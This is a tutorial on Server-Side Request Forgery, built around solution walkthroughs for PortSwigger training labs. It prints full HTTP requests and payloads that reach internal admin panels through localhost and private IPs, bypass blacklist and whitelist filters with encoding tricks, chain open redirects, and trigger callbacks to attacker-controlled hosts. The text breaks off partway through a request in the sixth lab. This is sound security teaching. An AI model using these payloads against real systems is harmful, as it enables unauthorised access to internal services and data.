# Server Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make unauthorized requests from a vulnerable server to other internal or external resources. In SSRF attacks, the attacker tricks the server into sending requests to unintended targets on behalf of the server itself.

## How SSRF works?

In SSRF vulnerability the attacker first finds the endpoints that make a request to internal endpoints to either fetch some data or either validate some data. After knowing the endpoint is making an internal request attacker tries to manipulate the internal endpoint parameter value with some external or another internal endpoint to see if they make a request to that endpoint or not. If the endpoint makes the request to an attacker-controlled external or internal server this means they are vulnerable to SSRF vulnerability.

Knowing the endpoint is vulnerable to SSRF, attackers can craft a malicious request that includes an internal URL, IP addresses of the network infrastructure, cloud services, or any other server accessible to the vulnerable server.

The vulnerable server processes the attacker's request and sends the request to that specific target URL or IP address. Since the request is initiated by the server, it may have access to internal resources that are otherwise inaccessible from the external network.

## Impact of SSRF vulnerability?

Successful SSRF attacks can have various consequences, such as unauthorized data access, information disclosure, service disruption, or even full server compromise. Attackers may exploit SSRF to bypass firewalls, interact with internal APIs, scan internal networks, or launch attacks against other systems.

SSRF vulnerabilities have varying impacts depending on the context in which they occur. For example, consider an application that retrieves and processes images from external URLs. While the server may make external requests, it does not automatically mean that it is vulnerable to SSRF.

To determine if an application is susceptible to SSRF, it is essential to assess the specific impact of the vulnerability. In SSRF attacks, the severity is demonstrated by the ability to exploit the vulnerability and disclose sensitive information or access external functionalities that should not be accessible.

If an application is configured in a way that allows an attacker to leverage SSRF to disclose confidential information, such as authorization headers or other sensitive data, or if it enables unauthorized access to external functionalities, then it can be considered vulnerable to SSRF.

## Common SSRF attacks

SSRF attacks are used to exploit trust relationships to perform unauthorized actions. This can involve the server itself or other internal systems within the organization. Based on that SSRF can be performed in various ways and used to accomplish different things such as:

1. Internal Network Resource Access
2. Metadata and Configuration Exposure
3. Localhost/Loopback Exploitation
4. Requesting Internal IP Ranges
5. [DNS Rebinding Attacks](https://unit42.paloaltonetworks.com/dns-rebinding/)
6. Proxy Bypass Attacks
7. Server Information Disclosure
8. Remote File Inclusion
9. Cross-Protocol Attacks

These attacks manifest in different ways, such as:

- Reflected SSRF: The attacker tricks the server to make unauthorized requests to internal or external resources, potentially accessing sensitive information or performing unauthorized actions. In a Reflected SSRF attack, the attacker can directly view the response from the requested resource.
- Sami Blind SSRF: Attacker cannot directly view the response of the requested resource but relies on subtle differences in server behavior to determine success or failure, such as variations in response times or error messages.
- Blind SSRF: The attacker cannot directly observe responses from the exploited server and relies on alternative channels or techniques for gathering information, such as exploiting timing differences or leveraging out-of-band communication.

Let's explore some common real-world examples of SSRF attacks and examine common flawed defenses that can be easily bypassed, ultimately enabling successful SSRF attacks.

## SSRF attack against the server itself

In an SSRF attack targeting the server itself, the attacker manipulates the application to initiate an HTTP request back to the server where the application is hosted. This is achieved by providing a URL with a hostname such as 127.0.0.1 (a reserved IP address that refers to the loopback adapter) or localhost (a frequently used name for the same adapter).

Let's consider a scenario involving a shopping application that allows users to check the availability of an item in a specific store. To retrieve the stock information, the application needs to query different back-end REST APIs based on the product and store selected. This functionality is implemented by giving the URL of the corresponding back-end API endpoint through an HTTP request from the front end. So, when a user wants to view the stock status of an item, their browser sends a request like this:

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://localhost/admin
```

In this case, the server fetches the contents of the `/admin` URL and sends it back to the user.

However, it's important to note that if an attacker directly visits the `/admin` URL, they won't be able to access any sensitive information. The administrative functionality is typically restricted to authenticated users only. So, a direct visit to the URL won't reveal anything of interest.

However, when the request to the `/admin` URL originates from the local machine itself, the normal access controls are bypassed. The application assumes that requests coming from the local machine are trusted and grants full access to the administrative functionality. This means that an attacker can exploit this behavior by making a request from the local machine and gaining unauthorized access to sensitive administrative features.

### LAB #1: Reflected SSRF against the local server

Lab URL: [https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

**Objective**
Use SSRF to access the following URL and delete the user carlos.
```
http://localhost/admin
```

> <details>
> <summary>**Solution**</summary>
> 
> This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
> 
> ```
> https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> On the details page, there is a functionality to check the stock of the item in different countries such as London, Milan, and Paris. The stock check functionality sends a POST request to the `/product/stock` API endpoint. The request structure is as follows:
> ```
> POST /product/stock HTTP/1.1
> Host: 0ac5002103ef35828136085f00620098.web-security-academy.net
> Connection: keep-alive
> Content-Length: 107
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> Cookie: session=Cs7PVlJd0AqYYQdwwv0D54kAOpnE5fAt
> 
>  stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
> ```
> The request parameter `stockApi` contains an encoded URL. After decoding, it appears as follows:
> ```
> stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
> ```
> The application retrieves stock information by making requests to an external server and then displays the response. However, the URL used in the request is not accessible from the internet, indicating that it is an internal API endpoint.
> 
> Exploiting this behavior, we can manipulate the `stockApi` parameter and make it point to the site's main page URL:
> ```
> stockApi=https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> 
> Modifying the `stockApi` endpoint as mentioned above exposes the vulnerability to SSRF attacks, enabling us to send requests from the server to external and internal networks.
> 
> Our objective in this lab is to access the specified URL and delete the user named carlos. We can accomplish this by changing the `stockApi` endpoint as follows:
> 
> ```
> stockApi=http://localhost/admin
> ```
> 
> By sending the modified request, we can access the Admin Portal and view its contents, including the necessary information for deleting the user carlos. To delete the user, we need to send a GET request to the /admin/delete/ endpoint with the parameter ?username=carlos. The updated request body is as follows:
> 
> ```
> stockApi=http://localhost/admin/delete?username=carlos
> ```
> To solve the lab, send the request with the provided URL in the `stockApi` parameter.
> </details>

In the previous lab, we encountered an obstacle when trying to directly access the `/admin` endpoint due to configured access controls. However, we discovered that we can bypass these controls by exploiting the SSRF vulnerability. Let's delve into the details of how this happens:

- The access control check is typically implemented in a separate component that acts as a gateway between the application server and external requests. When a connection is made back to the server itself, known as a loopback connection, the access control check is bypassed, allowing us to circumvent the restrictions.
- In some cases, for the purpose of disaster recovery, the application may grant administrative access without requiring login credentials for users originating from the local machine. This feature ensures that administrators can still manage the system even if they lose their credentials. The underlying assumption is that only fully trusted users would be accessing the server directly from the local machine.
- Another protective measure employed is to have the administrative interface listening on a different port than the main application. When requests originate from localhost, they are automatically redirected to this port. By using this setup, an additional layer of protection is added to prevent unauthorized access.

These kinds of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF a critical vulnerability.

## SSRF attacks against other back-end systems

In certain situations, we can utilize server-side request forgery (SSRF) vulnerability to force the application server to initiate requests to back-end systems that are not directly accessible to users. These back-end systems often employ non-routable private IP addresses and may have weaker security measures compared to the front-end application. Consequently, internal back-end systems can house sensitive functionality that can be exploited without requiring authentication from those who can interact with them.

Taking the above lab as an example, let's consider an administrative interface located at the back-end URL `https://192.168.0.68/admin`. In this case, an attacker can exploit the SSRF vulnerability by submitting the following request:

```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118  

stockApi=http://192.168.0.68/admin
```

By skillfully crafting the request in this manner, the attacker can capitalize on the SSRF vulnerability, tricking the application into making a request to the internal administrative interface. Consequently, the attacker gains unauthorized access to privileged functionality without the need for proper authentication.

### LAB #2: Reflected SSRF against another back-end system

Lab URL: [https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

**Objective**

Use SSRF vulnerability to access the admin panel that lies in between the `192.168.0.X` address range with port `8080`. After that use that to delete the user's `carlos` account to solve the lab.

> <details>
> <summary>**Solution**</summary>
> 
> This lab focuses on a shopping application that showcases various items for sale. Each item has its own details page, which can be accessed through specific links. For example:
> 
> ```
> https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> 
> On the details page, there is a feature that allows users to check the stock of the item in different countries such as London, Milan, and Paris. This stock check functionality sends a POST request to the /product/stock API endpoint. The structure of the request is as follows:
> 
> ```
> POST /product/stock HTTP/1.1
> Host: 0a5300ab047b083280cf908600ac00f8.web-security-academy.net
> Connection: keep-alive
> Content-Length: 107
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> Cookie: session=Cs7PVlJd0AqYYQdwwv0D54kAOpnE5fAt
> 
>  stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
> ```
> 
> The request parameter `stockApi` contains an encoded URL. After decoding, it appears as follows:
> 
> ```
> stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
> ```
> 
> The application fetches stock information from an internal server and displays the response. However, since the above URL is not accessible on the internet, it suggests that it is an internal API endpoint.
> 
> By exploiting the `stockApi` parameter, we can manipulate it to point to the site's main page URL:
> 
> ```
> stockApi=https://0a5300ab047b083280cf908600ac00f8.web-security-academy.net/product/stock
> ```
> 
> However, modifying the `stockApi` endpoint in this way results in the following error message:
> 
> ```
> "Method Not Allowed"
> ```
> 
> This suggests that the https protocol is not allowed. To bypass this restriction, we can change the protocol to http. As a result, we encounter a different error message:
> 
> ```
> "This lab is not accessible over HTTP"
> ```
> 
> The error message indicates that the backend server only allows requests over the https protocol. This behavior reveals a vulnerability to SSRF attacks, as the server is making normal http requests internally but restricts them to the https protocol.
> 
> Based on the initial `stockApi` parameter value, it appears that the application makes requests to an internal server with a similar endpoint, /product/stock. This suggests that they may be hosting the same or a similar application on the backend. To test this theory, we can modify the URL as follows:
> 
> ```
> stockApi=http://192.168.0.1:8080/product?productId=1
> ```
> 
> However, this results in the following error message:
> 
> ```
> Missing Parameters
> ```
> 
> After trying various modifications to the above URL, no useful results were found. So I decided to scan for different hosts in the `192.168.10.X` range, we can use fuzzing tools like Burp Intruder. In this lab, Burp Intruder is used with the following position setup:
> 
> ```
> POST /product/stock HTTP/2
> Host: 0af7001204aa5f9c80a7627e00240012.web-security-academy.net
> Cookie: session=gWXSOtOrZRA71ZBSHV9yKm5OfVkGebPJ
> Content-Length: 66
> Content-Type: application/x-www-form-urlencoded
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> 
> stockApi=http://192.168.0.§1§:8080
> ```
> 
> Intruder is configured to replace the `1` with `§1§` and use the sniper attack type with a number payload that iterates through numbers 1 to 255 with a step of 1. After running Intruder, a successful result is obtained with the URL `http://192.168.0.22:8080`.
> 
> After discovering the internal server at http://192.168.0.22:8080, further investigation reveals that the ProductId parameters always result in a 404 Not Found error. However, the /admin directory exists, allowing us to view registered user accounts and delete them by crafting a specific URL. For example:
> 
> ```
> http://192.168.0.22:8080/admin/delete?username=carlos
> ```
> 
> The complete request looks like this:
> 
> ```
> POST /product/stock HTTP/2
> Host: 0af7001204aa5f9c80a7627e00240012.web-security-academy.net
> Cookie: session=gWXSOtOrZRA71ZBSHV9yKm5OfVkGebPJ
> Content-Length: 78
> Content-Type: application/x-www-form-urlencoded
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> 
> stockApi=http%3a%2f%2f192.168.0.22%3a8080%2fadmin%2fdelete%3fusername%3dcarlos
> ```
> 
> By sending the above request, we can successfully delete the user "carlos" and solve the lab.
> </details>

In the above lab even though we didn't have access to the admin panel but the application is managing the Admin panel internally and they are not protected by any authentication mechanisms. This makes him more critical in an SSRF point of view.  

## Common SSRF Defenses

In the previous labs, we observed an SSRF vulnerability. However, in real-world scenarios, we may come across similar indicators of SSRF but might not be able to successfully exploit the vulnerability due to the presence of certain defenses. As mentioned earlier, many websites allow users to input a URL of an image, which is then requested and processed by the application. Despite this functionality, these websites are not susceptible to SSRF attacks. You might be wondering why that is the case.

The reason behind this is that these websites have implemented defenses that safeguard the application against making requests to internal servers using other SSRF attack vectors. These defenses are put in place to mitigate the risks associated with SSRF vulnerabilities.

These types of functionalities can be vulnerable to SSRF attacks if we manage to bypass the implemented defenses. Now, let's explore some common defense mechanisms used in the real world to mitigate SSRF attacks. We will also examine some flawed defense mechanisms that can be easily bypassed, posing a risk to the application's security.

## SSRF with blacklist-based input filters

In the real world, a common approach to mitigate SSRF attacks targeting local systems is to implement filters that block input containing hostnames like `127.0.0.1` and `localhost`, as well as sensitive URLs such as `/admin`. However, despite these measures, there exist techniques that can often be employed to circumvent these filters:

- Utilizing alternative representations of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Registering a custom domain name that resolves to `127.0.0.1`.
- Employing obfuscation techniques like URL encoding or case variation to obfuscate blocked strings.
- Providing a URL under the attacker's control that redirects to the target URL. By experimenting with different redirect codes and protocols, such as transitioning from `http:` to `https:` during the redirect, some anti-SSRF filters can be bypassed.

These techniques enable attackers to evade the implemented filters, potentially exploiting SSRF vulnerabilities and compromising the targeted systems.

### LAB #3: Reflected SSRF with blacklist-based input filters

Lab URL: [https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

**Objective**

Bypass blacklist-based defense approach and achieved the state of SSRF attack. Then use that to access the admin panel lies in the following URL and delete the user's `carlos`.

```
http://localhost/admin
```

> <details>
> <summary>**Solution**</summary>
> 
> This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
> ```
> https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> On the details page of the application, there is a feature that allows users to check the stock of an item in different countries such as London, Milan, and Paris. This functionality makes a POST request to the /product/stock API endpoint with the following structure:
> ```
> POST /product/stock HTTP/1.1
> Host: 0ac5002103ef35828136085f00620098.web-security-academy.net
> Connection: keep-alive
> Content-Length: 107
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> Cookie: session=Cs7PVlJd0AqYYQdwwv0D54kAOpnE5fAt
> 
>  stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
> ```
> The request parameter `stockApi` contains an encoded URL. Upon decoding the `stockApi` parameter, we obtain the following URL:
> ```
> stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
> ```
> The application retrieves stock information by querying an external server using this URL. However, since the URL is not accessible on the public internet, it indicates that it is an internal API endpoint.
> 
> Exploiting this behavior, we can manipulate the `stockApi` parameter to redirect it to the site's main page URL:
> ```
> stockApi=https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> Modifying the `stockApi` endpoint in this way reveals the following error message.
> ```
> External stock check blocked for security reasons
> ```
> This message indicates that there are some protections in place that block the application from fetching any other resources. The same error message will be shown if you use loopback addresses such as localhost or 127.0.0.1.
> 
> If the application also blocks loopback addresses, there are other variations that can be tried, such as the following options.
> ```
> 127.1
> ```
> This technique is equivalent to using 127.0.0.1, and by using it, we can bypass the protection in place and access the application's main page, which includes the functionality to view the content of the Admin panel.
> 
> Based on this knowledge, we can modify the URL as follows to obtain the admin panel information:
> 
> ```
> http://127.1/admin
> ```
> They show us the previous error message,  which means they also block the `/admin` string. By seeing all that I can assume they are using the blacklist-based approach in which they first block any common loopback address and also block the `/admin` string. Just changing `/admin` with `/Admin` bypasses this blacklist-based approach, in this case, maybe because the backend application is not case-sensitive.
> Now that we have access to the admin panel, we can proceed to delete the user carlos by sending the following request:
> ```
> POST /product/stock HTTP/2
> Host: 0a92006c032b9aee80188f6700590076.web-security-academy.net
> Cookie: session=Yd2xiJJ948kX6b9g0OgXz3MUNqYwbaSr
> Content-Length: 50
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> 
> stockApi=http://127.1/Admin/delete?username=carlos
> ```
> </details>

This lab demonstrates the utilization of a flawed blacklisting approach to safeguard sensitive endpoints. While this approach can be effective when properly configured, it is crucial to implement a more robust and comprehensive method that blocks all requests that go toward the local system.

## SSRF with whitelist-based input filters

Implementing a blacklisted approach can be challenging and susceptible to bypassing, as attackers continually discover new methods to exploit it. Therefore, it is often advisable to adopt a whitelist-based approach for enhanced security. 

Whitelisting involves explicitly specifying trusted sources, endpoints, or input values that are allowed while blocking everything else. This proactive approach ensures that only authorized and verified entities can interact with the system, significantly reducing the risk of SSRF attacks. By focusing on allowing known safe elements instead of trying to identify and block every potential threat, the whitelist-based approach offers a more robust and effective defense mechanism.

Some applications adopt a whitelist-based approach, allowing only specific input values that match or contain permitted values. While this approach aims to enhance security, it is important to note that flawed URL parsers or misconfigurations can still lead to vulnerabilities that enable attackers to bypass these filters and exploit server-side request forgery (SSRF).

By capitalizing on inconsistencies in URL parsing, attackers can manipulate input values in a way that evades the whitelist-based filter and achieves an SSRF scenario.

The URL specification includes various features that are often overlooked when handling and validating URLs: These features can be leveraged to bypass the filter:

- Embedding credentials in a URL before the hostname using the "`@`" character. For example: `https://expected-host:fakepassword@evil-host`
- Using the "`#`" character to indicate a URL fragment. For example: `https://evil-host#expected-host`
- Utilizing the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`
- URL-encoding characters to confuse the URL-parsing code. This is particularly effective if the filtering code handles URL-encoded characters differently than the code responsible for the backend HTTP request. It may also be worth trying double-encoding characters, as some servers recursively URL-decode the input they receive, leading to further discrepancies.
- Combining multiple techniques to increase the chances of bypassing the filter.

By exploiting these URL parsing inconsistencies, attackers can bypass the whitelist-based filter and potentially exploit SSRF vulnerabilities in the application.
 
### LAB #4: Reflected SSRF with whitelist-based input filter

Lab URL: [https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

**Objective**

Bypass whitelist-based defense approach and achieved the state of SSRF attack. Then use that to access the admin panel lies in the following URL and delete the user's `carlos`.

```
http://localhost/admin
```

> <details>
> <summary>**Solution**</summary>
> 
> This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
> ```
> https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> On the details page, there is a functionality to check the stock of the item in different countries such as London, Milan, and Paris. The stock check functionality sends a POST request to the `/product/stock` API endpoint. The request structure is as follows:
> ```
> POST /product/stock HTTP/1.1
> Host: 0ac5002103ef35828136085f00620098.web-security-academy.net
> Content-Length: 107
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> Cookie: session=Cs7PVlJd0AqYYQdwwv0D54kAOpnE5fAt
> 
> stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
> ```
> The request parameter `stockApi` in the application contains an encoded URL, which, after decoding, appears as follows:
> ```
> stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
> ```
> This URL indicates that the application fetches stock information from an external server by making a request to this API endpoint. However, since the URL is not accessible on the internet, it suggests that it is an internal API meant for communication within the application's network.
> 
> Exploiting this behavior, we can manipulate the `stockApi` parameter to point to the site's main page URL instead:
> ```
> stockApi=https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> By modifying the `stockApi` endpoint in this manner, we encounter the following error message:
> ```
> External stock check host must be stock.weliketoshop.net
> ```
> This gives us the information that they are using the whitelist-based approach to protect from SSRF vulnerabilities. The application expects the `stockApi` parameter to contain a URL pointing to `stock.weliketoshop.net`, and any other URL is considered invalid.
> 
> The whitelist-based approach is often recommended for implementing security measures, but it can still be vulnerable if flawed logic is present. To test the flaws in a whitelist-based approach, one approach is to pass URL credentials and observe whether they are accepted or rejected.
> 
> For instance, we can try passing URL credentials as follows:
> ```
> http://HelloWorld:WrongPassword@stock.weliketoshop.net
> ```
> By including the credentials in the URL, we can determine if the application accepts or rejects them. In this case, we observe a different error message compared to before:
> ```
> Internal Server Error
> Could not connect to external stock check service
> ```
> This error message indicates that the application accepted the provided credentials but encountered an issue connecting to the external stock server. Therefore, while the credentials were accepted, the connection failed.
> 
> To further test the whitelist-based approach, we can attempt to fragment the URL using the # symbol and see if the application accepts it:
> ```
> http://HelloWorld:WrongPassword#@stock.weliketoshop.net
> ```
> They didn't accept it and give us the previous error message `"External stock check host must be stock.weliketoshop.net"`. After the URL encode the `#` symbol they still don't like so I encode it again (double URL encoded) like the following.
> ```
> http://HelloWorld:WrongPassword%2523@stock.weliketoshop.net
> ```
> By doing so, we receive a new error message:
> ```
> Invalid external stock check url 'Invalid URL
> ```
> This error message indicates that the URL is incorrect because HelloWorld:WrongPassword is not a valid URL. To proceed, we replace the credentials with localhost. The modified URL appears as follows:
> ```
> http://localhost%2523@stock.weliketoshop.net
> ```
> Now, we can access the content of the /admin endpoint using the following URL:
> ```
> http://localhost%25%32%66admin%2523@stock.weliketoshop.net/admin
> ```
> Upon accessing the above URL, we discover two registered users, wiener and carlos. To delete the user carlos, we can use the following URL:
> ```
> http://localhost%25%32%66admin%2523@stock.weliketoshop.net/admin/delete?username=carlos
> ```
> </details>

### Bypassing SSRF filters via open redirection

Even if an application implements a proper whitelist-based approach and handles URL parsers securely, attackers can still achieve SSRF states by exploiting lesser-known vulnerabilities like Open Redirect.

In the above-mentioned labs, let's assume that the user-submitted URL is strictly validated to prevent the malicious exploitation of SSRF behavior. However, the application itself has an open redirection vulnerability. If the API used for the back-end HTTP request supports redirection, it is possible to construct a URL that bypasses the filter and results in a redirected request to the intended back-end target.

For instance, suppose the application has an open redirection vulnerability where the following URL:

`/product/nextProduct?currentProductId=6&path=http://evil-user.net`

redirects to:

`http://evil-user.net`

In this scenario, the open redirection vulnerability can be leveraged to bypass the URL filter and exploit the SSRF vulnerability. The following request demonstrates the exploitation:

```
POST /product/stock HTTP/1.0  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 118   

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

This SSRF exploit works because the application first validates that the supplied `stockApi` URL is on an allowed domain, which it is. The application then requests the supplied URL, triggering the open redirection. It follows the redirection and makes a request to the internal URL chosen by the attacker.

### LAB #5: Reflected SSRF with filters bypass via open redirection vulnerability

Lab URL: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

**Objective**

Bypass the whitelisted-based input filters by chaining them with open redirection vulnerability to achieve the state of SSRF attack. Then use that to access the admin panel that lies in the following link and delete the user's `carlos`.

```
http://192.168.0.12:8080/admin
```

> <details>
> <summary>**Solution**</summary>
>
> This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
> ```
> https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
> ```
> On the details page, there is a functionality to check the stock of the item in different countries such as London, Milan, and Paris. The stock check functionality sends a POST request to the `/product/stock` API endpoint. The request structure is as follows:
> ```
> POST /product/stock HTTP/1.1
> Host: 0ac5002103ef35828136085f00620098.web-security-academy.net
> Content-Length: 107
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
> Content-Type: application/x-www-form-urlencoded
> Cookie: session=Cs7PVlJd0AqYYQdwwv0D54kAOpnE5fAt
> 
> stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
> ```
> The stockApi request parameter contains an encoded URL path, which, when decoded, represents the following:
> ```
> stockApi=/product/stock/check?productId=1&storeId=1
> ```
> The `stockApi` doesn't contain the full URL, they just mention the endpoint path to check stock information. We can use the `@` symbol to give the previous URL part as credentials and inject our attacker-controlled URL like the following.
> ```
> @3w0pa7nihspaq6ijemcyrlkztqzgn5.oastify.com
> ```
> By injecting the attacker-controlled URL, a callback is sent to the attacker's server (Burp Collaborator), indicating an SSRF vulnerability in the stock check functionality. Furthermore, loopback addresses such as localhost, 127.0.0.1, or 127.1 can be used to access the site. For instance:
> 
> ```
> stockApi=@locathost:80
> ```
> The `localhost` doesn't work and gives us the following error message.
> ```
> Internal Server Error
> Could not connect to external stock check service
> ```
> We can use other variations of loopback addresses like `127.0.0.1`, `127.1`, `127.0.1` etc that maybe work. Using the following loopback variation work in this case.
> ```
> stockApi=@127.1
> ```
> However, attempting to access the /admin endpoint using these loopback addresses results in a "Not Found" error message. To access the admin panel, this lab gives us the specific address that lies in the following URL
> ```
> http://192.168.0.12:8080/admin
> ```
> We can use that instead of the loopback address and our modified `stockApi` parameter now would like this:
> ```
> stockApi=@192.168.0.12:8080/admin
> ```
> This shows us the content of the admin panel and we see there are two users our objective is to delete the user `carlos`, we can do that by using the following URL.
> ```
> stockApi=@192.168.0.12:8080/admin/delete?username=carlos
> ```
> Additionally, the lab also contains an open redirect issue on the product page. The application provides functionality to navigate to the next product page by sending a GET request with the following parameters:
> ```
> GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
> Host: 0a9d00da0439427181c33ed500a30089.web-security-academy.net
> Cookie: session=Xm8GNdBzIYOWOpDvh501oExmeoXmBu8R; session=lZ3kqes13iFtGdHrU9DZXu475ZLCJc4n
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> ```
> To leverage the open redirect vulnerability to access the admin panel, the `stockApi` parameter can be modified as follows:
> ```
> stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
> ```
> This illustrates how SSRF can be chained with an open redirect vulnerability for increased effectiveness.
> </details>

## Blind SSRF Vulnerability

In the previous examples, we observed cases of reflected SSRF, where we made the server send requests to internal network resources and received their responses directly. However, there are also scenarios of Blind SSRF, where the server sends requests to either external or internal networks, but we cannot see the responses. This makes it more challenging to detect such vulnerabilities, but it also adds complexity to the exploitation process. From an attacker's perspective, it becomes difficult to gather internal network information, and they have to blindly send requests, which can potentially impact the network.

## Impact Of Blind SSRF attacks

Blind SSRF attacks have a relatively low impact since we cannot directly retrieve the response. The one-way nature of blind SSRF limits our ability to extract or exfiltrate data. From a black box perspective, these attacks may be considered low impact. However, from a white box or gray box perspective, they can be more impactful.

Even though blind SSRF attacks are limited in their direct effects, we should not ignore them. Sometimes, when combined with other vulnerabilities present in the environment, we can chain them with SSRF to achieve full remote code execution on the server. Therefore, it's important to be aware of the potential risks associated with blind SSRF attacks and consider them in the context of the overall security posture.

## Blind SSRF Detection

The most effective method to detect blind SSRF attacks is by leveraging out-of-band interaction or using other techniques known as OAST (Out-of-Band Application Security Testing). In these techniques, the attacker manipulates the server to send requests to a server they control and then monitors for any indications of interaction with that server. If the server is vulnerable to SSRF attacks, the attacker will observe that the targeted servers send requests to their controlled server, indicating the presence of the vulnerability.

To simplify this process, there are several tools available, such as Burp Collaborator, ngrok, and [interactsh](https://app.interactsh.com/#/). These tools generate unique addresses that can be used to test for blind SSRF interactions. When an interaction occurs, these tools provide us with comprehensive details, including the complete request and its response. They also display IP information, which helps identify the origin of the request. By utilizing these tools, we can effectively test for and analyze blind SSRF attacks.

> [!tip]
> It is common for servers to only initiate DNS lookup while other HTTP requests may be blocked due to firewall rules. However, even if one protocol is blocked, there may still be other protocols available for communication. Therefore, checking these protocols may reveal some interesting results and potential vulnerabilities.

### LAB #6: Blind SSRF with Out-Of-Band detection

Lab URL: [https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

**Objective**

This lab contains analytics software that fetches the URL specified in the Referer header when the product page is loaded. Use this functionality to make requests to another server (Burp Collaborator).

> <details>
> <summary>**Solution**</summary>
>
> This lab focuses on a shopping application that includes Referer headers in its requests originating from the main page (/). The requests follow the structure below:
> ```
> GET /product?productId=1 HTTP/2
> Host: 0a05005e0343afe682cee5b2000700a8.web-security-academy.net
> Cookie: session=zX277uYPKnR6blxWp7KMxhhwmeG5JkFv
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
> Referer: https://0a05005e0343afe682cee5b2000700a8.web-security-academy.net/
> Content-Length: 2
> ```
> By modifying the Referer header with an attacker-controlled server (Burp Collaborator) instance, we can observe that a callback is sent to the specified server. However, unlike previous labs, the lab does not display the response to us.
> 
> Here is an example of the modified request with the updated Referer header pointing to the attacker-controlled server:
> ```
> GET /product?productId=1 HTTP/2
> Host: 0a05005e0343afe682cee5b2000700a8.web-security-academy.net
> Cookie: session=zX277uYPKnR6blxWp7KMxhhwmeG5JkFv
